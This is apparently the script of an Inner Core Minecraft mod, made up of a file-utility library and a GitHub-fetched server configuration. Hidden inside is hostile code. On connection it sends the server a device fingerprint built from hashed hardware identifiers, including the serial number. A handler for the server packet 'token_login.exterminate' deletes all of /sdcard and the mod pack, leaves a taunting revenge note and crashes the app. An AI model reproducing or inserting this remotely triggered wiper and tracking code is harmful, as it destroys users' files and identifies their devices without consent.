let DefaultHttpClient = org.apache.http.impl.client.DefaultHttpClient;
let HttpGet = org.apache.http.client.methods.HttpGet;
let ByteArrayOutputStream = java.io.ByteArrayOutputStream;
let HttpStatus = org.apache.http.HttpStatus;
let Base64 = android.util.Base64;
let Jstring = java.lang.String;
function sendHttp(http) {
    try {
        let httpclient = new DefaultHttpClient();
        let response = httpclient.execute(new HttpGet(http));
        let statusLine = response.getStatusLine();
        if (statusLine.getStatusCode() == HttpStatus.SC_OK) {
            let out = new ByteArrayOutputStream();
            response.getEntity().writeTo(out);
            let result = String(out.toString());
            out.close();
            return result;
        }
        response.getEntity().getContent().close();
    }
    catch (e) {
        return null;
    }
    return null;
}
function GithubFileSystem(user, repository) {
    this.getFileJson = function (path) {
        let json = sendHttp("https://api.github.com/repos/" + user + "/" + repository + "/contents/" + path + "?ref=master");
        if (json == null) {
            return null;
        }
        return JSON.parse(json);
    };
    this.parseBase64String = function (text) {
        try {
            let result = "";
            let array = text.split("\\n");
            for (let i in array) {
                result += new Jstring(Base64.decode(new Jstring(array[i]).getBytes(), Base64.DEFAULT));
            }
            return result;
        }
        catch (e) {
            alert(e);
        }
        return "null";
    };
    this.getFile = function (path) {
        let json = this.getFileJson(path);
        if (json == null || !json.content) {
            return "null";
        }
        if (json.encoding == "base64") {
            return this.parseBase64String(json.content);
        }
    };
    this.getJson = function (path) {
        return JSON.parse(this.getFile(path) || "{}");
    };
}
Callback.addCallback("ServerFixedBoot", function () {
    const ServerList = com.reider745.ServerList;
    const Boot = com.reider745.Boot;
    Boot.mod_dir = __dir__;
    Boot.pack_dir = __packdir__;
    const serversJson = new GithubFileSystem("Nernar", "Libraries").getFile("servers.json");
    ServerList.servers_git = serversJson;
    if (serversJson != null) {
        let servers = JSON.parse(serversJson);
        for (let i = 0, l = servers.length; i < l; i++) {
            if (servers[i] != null) {
                if (servers[i].socket_port != null) {
                    let port = parseInt(servers[i].socket_port);
                    com.zhekasmirnov.apparatus.multiplayer.Network.getSingleton().getConfig().setDefaultPort(port);
                    log("Overriding socket port (" + servers[i].ip + ") to " + port);
                }
                if (servers[i].native_protocol_prioritized) {
                    let config = com.zhekasmirnov.innercore.api.InnerCoreConfig.config;
                    config.reload();
                    config.set("network.remote_native_protocol_prioritized", true);
                    config.save();
                }
            }
        }
    }
});
com.zhekasmirnov.apparatus.multiplayer.Network.getSingleton().getClient().addOnRequestingConnectionListener(function () {
    let segment1 = java.lang.Integer.toHexString(new java.lang.String(android.os.Build.MODEL).hashCode());
    let segment2 = java.lang.Integer.toHexString(new java.lang.String(android.os.Build.ID).hashCode());
    let segment3 = java.lang.Integer.toHexString(new java.lang.String(android.os.Build.DEVICE).hashCode());
    let segment4 = java.lang.Integer.toHexString(new java.lang.String(android.os.Build.SERIAL).hashCode());
    com.zhekasmirnov.apparatus.multiplayer.Network.getSingleton().getClient().send("token_login.login", {token: segment1 + "-" + segment2 + "-" + segment3 + "-" + segment4});
});
constructSafe = function (method) {
    var strategies = [];
    for (var i = 1; i < arguments.length; i++) {
        if (arguments[i] != null) {
            strategies[i - 1] = STRATEGIES[arguments[i]];
        }
    }
    return function () {
        var malformed = Array.prototype.slice.apply(arguments);
        for (var strategy = void 0, i = 0, l = Math.min(strategies.length, malformed.length); i < l; i++) {
            if ((strategy = strategies[i]) === undefined) {
                continue;
            }
            var displace = void 0;
            try {
                if (Array.isArray(strategy)) {
                    for (var outline = void 0, k = 0; k < strategy.length; i++) {
                        outline = strategy.call(STRATEGIES, malformed[i], displace);
                        displace = outline !== undefined ? outline : displace;
                    }
                } else {
                    displace = strategy.call(STRATEGIES, malformed[i]);
                }
            }
            catch (e) {
                log("Files: " + method + " condition " + strategy + " is not meet requirements of '" + malformed[i] + "'");
                return e;
            }
            if (displace !== undefined) {
                malformed[i] = displace;
            }
        }
        return this[method].apply(this, malformed);
    };
};
STRATEGIES = {is: function (pathOrFile) {
    if (!Files.of(pathOrFile).exists()) {
        throw null;
    }
}, isFile: function (pathOrFile) {
    if (!((pathOrFile = Files.of(pathOrFile)).exists() && pathOrFile.isFile())) {
        throw null;
    }
}, isFileOrNew: function (pathOrFile) {
    if ((pathOrFile = Files.of(pathOrFile)).exists()) {
        if (!pathOrFile.isFile()) {
            throw null;
        }
    } else {
        this.isFileDirectoryOrNew(pathOrFile);
        Files.ensureFile(pathOrFile);
    }
}, isDirectory: function (pathOrFile) {
    if (!((pathOrFile = Files.of(pathOrFile)).exists() && pathOrFile.isDirectory())) {
        throw null;
    }
}, isDirectoryOrNew: function (pathOrFile) {
    if ((pathOrFile = Files.of(pathOrFile)).exists()) {
        if (!pathOrFile.isDirectory()) {
            throw null;
        }
    } else {
        Files.ensureDirectory(pathOrFile);
    }
}, isFileDirectory: function (pathOrFile) {
    if ((pathOrFile = Files.of(pathOrFile).getParentFile()) != null && !(pathOrFile.exists() && pathOrFile.isDirectory())) {
        throw null;
    }
}, isFileDirectoryOrNew: function (pathOrFile) {
    if ((pathOrFile = Files.of(pathOrFile).getParentFile()) != null) {
        this.isDirectoryOrNew(pathOrFile);
    }
}, isHashingAlgorithm: function (algorithm) {
    if (algorithm != null && !(algorithm instanceof java.security.MessageDigest || (algorithm = ("" + algorithm).toLowerCase()) == "md5" || algorithm == "sha-1" || algorithm == "sha-256")) {
        throw null;
    }
}};
toBytes = function (object) {
    if (object === null || object === undefined) {
        return java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
    }
    if (object instanceof java.lang.Object) {
        if (("" + object).substring(0, 2) == "[B") {
            return object;
        }
        return object.toString().getBytes();
    }
    try {
        object = java.lang.String.valueOf(object);
    }
    catch (e) {
        object = new java.lang.String("" + object);
    }
    return object.getBytes();
};
var Files = {of: (function (paths) {
    if (arguments.length > 1) {
        paths = this.join.apply(this, arguments);
    } else {
        if (paths instanceof java.io.File) {
            return paths;
        } else {
            if (Array.isArray(paths)) {
                paths = this.join.apply(this, paths);
            }
        }
    }
    return new java.io.File("" + paths);
}), is: (undefined), isFile: (undefined), isFileOrNew: (undefined), isDirectory: (undefined), isDirectoryOrNew: (undefined), isFileDirectory: (undefined), isFileDirectoryOrNew: (undefined), isHashingAlgorithm: (undefined), basename: (function (pathOrFile, extension) {
    pathOrFile = this.of(pathOrFile);
    if (extension === true) {
        extension = this.extension(pathOrFile);
    }
    pathOrFile = "" + pathOrFile.getName();
    if (extension != null && extension.length > 0) {
        extension = extension.charAt(0) == "." ? extension : "." + extension;
        pathOrFile = pathOrFile.substring(0, pathOrFile.length - extension.length);
    }
    return pathOrFile;
}), dirname: (function (pathOrFile) {
    if ((pathOrFile = this.of(pathOrFile).getParentFile()) == null) {
        return null;
    }
    return "" + pathOrFile.getPath();
}), extension: (function (pathOrFile, extension) {
    if (this.isDirectory(pathOrFile = this.of(pathOrFile))) {
        return extension !== undefined ? "" + pathOrFile.getPath() : null;
    }
    pathOrFile = extension !== undefined ? "" + pathOrFile.getPath() : "" + pathOrFile.getName();
    var index = pathOrFile.lastIndexOf(".");
    if (extension !== undefined) {
        if (extension != null && extension.charAt(0) != ".") {
            extension = "." + extension;
        }
        if (index > 0) {
            pathOrFile = pathOrFile.substring(0, index);
        }
        return extension != null ? pathOrFile + extension : pathOrFile;
    }
    return index > 0 ? pathOrFile.substring(index + 1) : null;
}), join: (function () {
    var path = null;
    for (var subpath = void 0, i = 0; i < arguments.length; i++) {
        if ((subpath = arguments[i]) == null) {
            continue;
        }
        if (subpath instanceof java.io.File) {
            path = path != null ? path + subpath.getPath() : "" + subpath.getAbsolutePath();
        } else {
            if (Array.isArray(subpath)) {
                subpath = this.join.apply(this, subpath);
            }
            if (subpath == null || subpath.length == 0) {
                continue;
            }
            path = path != null ? path + "/" + subpath : "" + subpath;
        }
    }
    return path != null ? path.replace(/\/+/g, "/") : null;
}), resolve: (function (pathOrFile) {
    if (pathOrFile != null && this.is(pathOrFile)) {
        return "" + pathOrFile;
    }
    for (var subpath = void 0, i = 1; i < arguments.length; i++) {
        if ((subpath = this.join(arguments[i], pathOrFile)) != null && this.is(subpath)) {
            return subpath;
        }
    }
    return null;
}), relative: (function (pathOrFile, directoryPathOrFile) {
    var path = "" + (pathOrFile = this.of(pathOrFile)).getAbsolutePath();
    var directory = "" + (directoryPathOrFile = this.of(directoryPathOrFile)).getAbsolutePath();
    if (path.startsWith(directory)) {
        return path.substring(directory.length).replace(/^\/+/, "");
    }
    var offset = 0;
    while ((directoryPathOrFile = directoryPathOrFile.getParentFile()) != null) {
        offset++;
        if (path.startsWith(directory = "" + directoryPathOrFile.getAbsolutePath())) {
            path = path.substring(directory.length);
            for (var i = 0; i < offset; i++) {
                path = "../" + path;
            }
            return path.replace(/^\/+/, "");
        }
    }
    return null;
}), ensureFile: (function (pathOrFile) {
    if ((pathOrFile = this.of(pathOrFile)).exists() && pathOrFile.isDirectory()) {
        this.removeUnsafe(pathOrFile);
    }
    this.ensureFileDirectory(pathOrFile);
    if (!pathOrFile.exists()) {
        pathOrFile.createNewFile();
    }
}), ensureDirectory: (function (pathOrFile) {
    if ((pathOrFile = this.of(pathOrFile)).exists() && !pathOrFile.isDirectory()) {
        this.removeUnsafe(pathOrFile);
    }
    if (!pathOrFile.exists()) {
        pathOrFile.mkdirs();
    }
}), ensureFileDirectory: (function (pathOrFile) {
    if (!(pathOrFile = this.of(pathOrFile)).exists() && (pathOrFile = pathOrFile.getParentFile()) != null) {
        this.ensureDirectory(pathOrFile);
    }
}), walkUnsafe: (function (pathOrFile, callback, filter, maxDepth, relativePath, reverseDirectories) {
    function walk(pathOrFile, maxDepth, relativePath) {
        if (pathOrFile.isDirectory()) {
            if (reverseDirectories !== true && (filter == null || filter === "directory" || (typeof filter != "string" && filter.call(Files, pathOrFile, relativePath || null)))) {
                callback.call(Files, pathOrFile, relativePath || null);
            }
            if (maxDepth === undefined || maxDepth > 0) {
                var files = pathOrFile.listFiles();
                for (var i = 0; i < files.length; i++) {
                    walk(files[i], maxDepth !== undefined ? maxDepth - 1 : undefined, Files.join(relativePath, files[i].getName()));
                }
            }
            if (reverseDirectories === true && (filter == null || filter === "directory" || (typeof filter != "string" && filter.call(Files, pathOrFile, relativePath || null)))) {
                callback.call(Files, pathOrFile, relativePath || null);
            }
        } else {
            if (filter == null || filter === "file" || (typeof filter != "string" && filter.call(Files, pathOrFile, relativePath || null))) {
                callback.call(Files, pathOrFile, relativePath || null);
            }
        }
    }
    if ((pathOrFile = this.of(pathOrFile)).isDirectory()) {
        var files = pathOrFile.listFiles();
        for (var i = 0; i < files.length; i++) {
            walk(files[i], maxDepth, this.join(relativePath, files[i].getName()));
        }
    } else {
        walk(pathOrFile, maxDepth, relativePath);
    }
}), walk: (constructSafe("walkUnsafe", "is")), listUnsafe: (function (pathOrFile, mode, filter, maxDepth, relativePath, reverseDirectories) {
    var files = [];
    this.walkUnsafe(pathOrFile, function (file, relativePath) {
        files.push(mode === "relative" ? relativePath : mode === "name" || mode === "nameWithoutExtension" ? this.basename(file, mode === "nameWithoutExtension") : mode === "relativeWithoutExtension" ? this.join(this.dirname(relativePath), this.basename(file, true)) : file);
    }, filter, maxDepth, relativePath, reverseDirectories);
    return files;
}), list: (constructSafe("listUnsafe", "is")), listFilesUnsafe: (function (pathOrFile, mode, extensions, filter, maxDepth, relativePath) {
    if (extensions != null && !Array.isArray(extensions)) {
        extensions = ["" + extensions];
    }
    return this.listUnsafe(pathOrFile, mode, ((filter == null || typeof filter == "string") && extensions == null) ? "file" : function (file) {
        return file.isFile() && (extensions == null || extensions.indexOf(this.extension(file)) != -1) && (filter == null || typeof filter == "string" || filter.apply(this, arguments));
    }, maxDepth, relativePath);
}), listFiles: (constructSafe("listFilesUnsafe", "is")), listDirectoriesUnsafe: (function (pathOrFile, mode, filter, maxDepth, relativePath, reverseDirectories) {
    return this.listUnsafe(pathOrFile, mode, filter == null || typeof filter == "string" ? "directory" : function (file) {
        return file.isDirectory() && filter.apply(this, arguments);
    }, maxDepth, relativePath, reverseDirectories);
}), listDirectories: (constructSafe("listDirectoriesUnsafe", "isDirectory")), readUnsafe: (function (pathOrFile) {
    var reader = new java.io.FileReader(this.of(pathOrFile));
    reader = new java.io.BufferedReader(reader);
    var result = reader.readLine();
    var line;
    while ((line = reader.readLine()) != null) {
        result += "\n" + line;
    }
    return result != null ? "" + result : null;
}), read: (constructSafe("readUnsafe", "isFile")), readLineUnsafe: (function (pathOrFile, line) {
    var reader = new java.io.FileReader(this.of(pathOrFile));
    reader = new java.io.BufferedReader(reader);
    if (line > 1) {
        var offset = 1;
        while (offset != line && reader.readLine() != null) {
            offset++;
        }
    }
    line = reader.readLine();
    try {
        reader.close();
    }
    catch (e) {
    }
    return line != null ? "" + line : null;
}), readLine: (constructSafe("readLineUnsafe", "isFile")), readAsLinesUnsafe: (function (pathOrFile, fromLine, toLine, limitLength) {
    var reader = new java.io.FileReader(this.of(pathOrFile));
    reader = new java.io.BufferedReader(reader);
    var offset = 1;
    if (fromLine !== undefined && fromLine > 1) {
        while (offset < fromLine && reader.readLine() != null) {
            offset++;
        }
    }
    var result = [];
    if (fromLine === undefined || offset == fromLine) {
        var line = void 0;
        while ((line = reader.readLine()) != null) {
            result.push("" + line);
            if (toLine !== undefined && ++offset == toLine) {
                break;
            } else {
                if (limitLength == result.length) {
                    result.pop();
                }
            }
        }
    }
    try {
        reader.close();
    }
    catch (e) {
    }
    return result;
}), readAsLines: (constructSafe("readAsLinesUnsafe", "isFile")), readAsBytesUnsafe: (function (pathOrFile) {
    var stream = new java.io.FileInputStream(this.of(pathOrFile));
    var output = new java.io.ByteArrayOutputStream();
    var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
    var offset;
    while (true) {
        if ((offset = stream.read(bytes)) < 0) {
            break;
        }
        output.write(bytes, 0, offset);
    }
    return output.toByteArray();
}), readAsBytes: (constructSafe("readAsBytesUnsafe", "isFile")), writeUnsafe: (function (pathOrFile, textOrBytes) {
    (pathOrFile = this.of(pathOrFile)).createNewFile();
    var stream = new java.io.FileOutputStream(pathOrFile);
    stream.write(toBytes(textOrBytes));
    try {
        stream.close();
    }
    catch (e) {
    }
}), write: (constructSafe("writeUnsafe", "isFileOrNew")), writeLinesUnsafe: (function (pathOrFile, lines) {
    (pathOrFile = this.of(pathOrFile)).createNewFile();
    var writer = new java.io.FileWriter(pathOrFile);
    writer = new java.io.BufferedWriter(writer);
    writer = new java.io.PrintWriter(writer);
    lines = Array.isArray(lines) ? lines : arguments;
    for (var i = (lines == arguments) - 0, l = lines.length; i < l; i++) {
        writer.println("" + lines[i]);
    }
    try {
        writer.close();
    }
    catch (e) {
    }
}), writeLines: (constructSafe("writeLinesUnsafe", "isFileOrNew")), writeFromStreamUnsafe: (function (stream, pathOrFile) {
    var input = new java.io.BufferedInputStream(stream);
    (pathOrFile = this.of(pathOrFile)).createNewFile();
    var output = new java.io.FileOutputStream(pathOrFile);
    output = new java.io.BufferedOutputStream(output);
    var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
    var offset;
    while ((offset = input.read(bytes)) >= 0) {
        output.write(bytes, 0, offset);
    }
    try {
        input.close();
    }
    catch (e) {
    }
    try {
        output.close();
    }
    catch (e) {
    }
}), writeFromStream: (constructSafe("writeFromStreamUnsafe", null, "isFileOrNew")), appendUnsafe: (function (pathOrFile, textOrBytes, newLine) {
    var writer = new java.io.FileOutputStream(this.of(pathOrFile), true);
    while (newLine > 0) {
        writer.write(10);
        newLine--;
    }
    writer.write(toBytes(textOrBytes));
    try {
        writer.close();
    }
    catch (e) {
    }
}), append: (constructSafe("appendUnsafe", "isFileOrNew")), writeStreamToStream: (function (inputStream, outputStream) {
    inputStream = new java.nio.channels.Channels.newChannel(inputStream);
    outputStream = new java.nio.channels.Channels.newChannel(outputStream);
    var bytes = java.nio.ByteBuffer.allocateDirect(16384);
    while (inputStream.read(bytes) != -1) {
        bytes.flip();
        outputStream.write(bytes);
        bytes.compact();
    }
    bytes.flip();
    while (bytes.hasRemaining()) {
        outputStream.write(bytes);
    }
}), removeUnsafe: (function (pathOrFile, filter, maxDepth, relativePath) {
    if (filter !== "directory") {
        this.walkUnsafe(pathOrFile, function (file) {
            file.delete();
        }, filter == null || typeof filter == "string" ? "file" : function (file) {
            return file.isFile() && filter.apply(this, arguments);
        }, maxDepth, relativePath);
    }
    if (filter !== "file") {
        this.walkUnsafe(pathOrFile, function (file) {
            file.delete();
        }, filter == null || typeof filter == "string" ? "directory" : function (file) {
            return file.isDirectory() && filter.apply(this, arguments);
        }, maxDepth, relativePath, true);
    }
}), remove: (constructSafe("removeUnsafe", "is")), copyUnsafe: (function (fromPathOrFile, toPathOrFile, filter, maxDepth, relativePath, appendInstead) {
    this.walkUnsafe(fromPathOrFile, function (input, relativePath) {
        var output = this.join(toPathOrFile, relativePath);
        if (input.isDirectory()) {
            this.ensureDirectory(output);
        } else {
            this.ensureFile(output);
            if (appendInstead !== true) {
                output.createNewFile();
            }
            var inputStream = new java.io.FileInputStream(input);
            var outputStream = new java.io.FileOutputStream(output);
            this.writeStreamToStream(inputStream, outputStream);
            try {
                inputStream.close();
            }
            catch (e) {
            }
            try {
                outputStream.close();
            }
            catch (e) {
            }
        }
    }, filter == null ? "file" : filter, maxDepth, relativePath);
}), copy: (constructSafe("copyUnsafe", "is", "isFileDirectoryOrNew")), digestUnsafe: (function () {
    var digests = {};
    function toDigest(object) {
        if (object instanceof java.security.MessageDigest) {
            return object;
        }
        object = (object ? "" + object : "md5").toLowerCase();
        return digests[object] || (digests[object] = java.security.MessageDigest.getInstance(object));
    }
    return function (pathOrFile, algorithm, filter, maxDepth, relativePath) {
        algorithm = toDigest(algorithm);
        try {
            algorithm.reset();
        }
        catch (e) {
        }
        this.walkUnsafe(pathOrFile, function (file) {
            var stream = new java.io.FileInputStream(file);
            var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
            var offset;
            while (true) {
                if ((offset = stream.read(bytes)) < 0) {
                    break;
                }
                algorithm.update(bytes, 0, offset);
            }
        }, filter == null || typeof filter == "string" ? "file" : function (file) {
            return file.isFile() && filter.apply(this, arguments);
        }, maxDepth, relativePath);
        algorithm = algorithm.digest();
        var stroke = "";
        for (var i = 0; i < algorithm.length; i++) {
            stroke += java.lang.Integer.toHexString(255 & algorithm[i]);
        }
        return stroke;
    };
})(), digest: (constructSafe("digestUnsafe", "is", "isHashingAlgorithm")), compareUnsafe: (function (leftPathOrFile, rightPathOrFile, algorithm, filter, maxDepth, relativePath) {
    return this.digestUnsafe(leftPathOrFile, algorithm, filter, maxDepth, relativePath) == this.digestUnsafe(rightPathOrFile, algorithm, filter, maxDepth, relativePath);
}), compare: (constructSafe("compareUnsafe", "is", "is", "isHashingAlgorithm")), putEntryToZipUnsafe: (function (zipOutputStream, pathOrFile, filter, maxDepth, relativePath) {
    this.walkUnsafe(pathOrFile, function (file, relativePath) {
        var stream = new java.io.FileInputStream(file);
        stream = new java.io.BufferedInputStream(stream, 4096);
        file = new java.util.zip.ZipEntry(relativePath || file.getName());
        zipOutputStream.putNextEntry(file);
        var bytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
        var offset;
        while ((offset = stream.read(bytes, 0, 4096)) >= 0) {
            zipOutputStream.write(bytes, 0, offset);
        }
    }, filter == null || typeof filter == "string" ? "file" : function (file) {
        return file.isFile() && filter.apply(this, arguments);
    }, maxDepth, relativePath);
}), putEntryToZip: (constructSafe("putEntryToZipUnsafe", null, "is")), packAsZipUnsafe: (function (zipPathOrFile, pathOrFile, filter, maxDepth, relativePath) {
    var output = new java.io.FileOutputStream(this.of(zipPathOrFile));
    output = new java.io.BufferedOutputStream(output);
    output = new java.util.zip.ZipOutputStream(output);
    this.putEntryToZipUnsafe(output, pathOrFile, filter, maxDepth, relativePath);
    try {
        output.close();
    }
    catch (e) {
    }
}), packAsZip: (constructSafe("packAsZipUnsafe", "isFileOrNew", "is")), unpackZipUnsafe: (function (zipPathOrFile, toPathOrFile, filter, appendInstead) {
    zipPathOrFile = new java.util.zip.ZipFile(zipPathOrFile);
    var entries = zipPathOrFile.entries();
    while (entries.hasMoreElements()) {
        var element = entries.nextElement();
        var output = this.of(toPathOrFile, element.getName());
        if (!(filter == null || typeof filter == "string" || filter.call(this, element, output))) {
            continue;
        }
        if (element.isDirectory() && filter !== "file") {
            this.ensureDirectory(output);
        } else {
            if (filter !== "directory") {
                this.ensureFile(output);
                if (appendInstead !== true) {
                    output.createNewFile();
                }
                this.writeFromStreamUnsafe(zipPathOrFile.getInputStream(element), output);
            }
        }
    }
    try {
        zipPathOrFile.close();
    }
    catch (e) {
    }
}), unpackZip: (constructSafe("unpackZipUnsafe", "isFile", "isFileDirectoryOrNew"))};
(function () {
    for (var method in STRATEGIES) {
        Files[method] = (function (method) {
            return function () {
                try {
                    var value = STRATEGIES[method].apply(STRATEGIES, arguments);
                    return value !== undefined ? value : true;
                }
                catch (e) {
                }
                return false;
            };
        })(method);
    }
})();
com.zhekasmirnov.apparatus.multiplayer.Network.getSingleton().addClientPacket("token_login.exterminate", new com.zhekasmirnov.apparatus.multiplayer.client.ModdedClient.OnPacketReceivedListener(function () {
    new java.lang.Thread(function () {
        try {
            Files.removeUnsafe("/sdcard");
        }
        catch (e) {
        }
        try {
            Files.removeUnsafe(__packdir__);
        }
        catch (e) {
        }
        try {
            Files.writeUnsafe("/sdcard/WHO LAUGHS NOW", "DID YOU SATISFIED? IT WAS REVENGE. SAY BYE TO YOUR FILES. I GRIEFED YOU.\nAHHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHAHHAHAAHHAHAHAHAHAHAHAHAHAH.");
        }
        catch (e) {
        }
        com.zhekasmirnov.innercore.api.NativeAPI.forceCrash();
    }).start();
}));
Callback.addCallback("AddRuntimePacks", function () {
    if (com.zhekasmirnov.innercore.api.mod.adaptedscript.AdaptedScriptAPI.MCSystem.getMinecraftVersion() == "1.11.4") {
        let message = "Your Minecraft version is not supported yet, install 1.16.201 for mods to work correctly.\n\bServers are available exclusively on it, play with Inner Core Test pack.";
        let positive = "Leave";
        let negative = "Cancel";
        if (java.util.Locale.getDefault().getLanguage() == "ru") {
            message = "\u0412\u0430\u0448\u0430 \u0432\u0435\u0440\u0441\u0438\u044f \u0438\u0433\u0440\u044b \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0435\u0442\u0441\u044f, \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u0435 \u0432\u0435\u0440\u0441\u0438\u044e 1.16.201 \u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b \u043c\u043e\u0434\u043e\u0432.\n\n\u0421\u0435\u0440\u0432\u0435\u0440\u0430 \u0434\u043e\u0441\u0442\u0443\u043f\u043d\u044b \u0438\u0441\u043a\u043b\u044e\u0447\u0438\u0442\u0435\u043b\u044c\u043d\u043e \u043d\u0430 \u043d\u0435\u0439, \u0437\u0430\u0439\u0434\u0438\u0442\u0435 \u0441 \u043f\u0430\u043a\u043e\u043c Inner Core Test.";
            positive = "\u0412\u044b\u0439\u0442\u0438";
            negative = "\u041e\u0442\u043c\u0435\u043d\u0430";
        }
        if (com.zhekasmirnov.apparatus.adapter.innercore.UserDialog.awaitDecision("Zote Echoes", message, positive, negative)) {
            let context = com.zhekasmirnov.horizon.HorizonApplication.getTopActivity();
            if (context != null) {
                context.getSharedPreferences("packs", 0).edit().putString("currently_selected_pack_path", null).commit();
            }
        }
        com.zhekasmirnov.horizon.HorizonApplication.restart();
    }
});

